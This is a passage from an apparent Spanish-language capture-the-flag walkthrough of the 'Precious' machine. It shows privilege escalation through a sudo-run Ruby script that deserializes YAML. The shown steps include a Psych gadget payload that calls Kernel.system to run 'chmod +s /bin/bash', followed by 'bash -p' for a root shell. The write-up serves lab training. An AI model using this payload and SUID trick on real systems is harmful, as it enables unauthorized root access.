        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
...
```
Vaya, vaya, vemos que ahí dice **Root**.

* Hagamos otra prueba, ahora en vez de usar **whoami** pongamos **id**:
```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
```
Excelente, con esto podemos escalar privilegios, solo demos permisos de ejecución para la **Bash** a cualquier usuario, esto para ser **Root**.

Hagámoslo por pasos:

* Antes veamos que permisos tiene la **Bash**:
```bash
henry@precious:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

* Ahora agreguemos el cambio al script para cambiar los permisos:
```bash
       socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: chmod +s /bin/bash
          method_id: :resolve
```

* Ejecutamos el script con **SUDO**:
```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
```

* Comprobamos si se hizo el cambio:
```bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

* ¡Si se hizo!, entremos a la **Bash** y busquemos la flag:
```bash
henry@precious:~$ bash -p
bash-5.1# whoami
root
bash-5.1# ls
dependencies.yml  user.txt
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
```
Y listo, ya tenemos las flags.
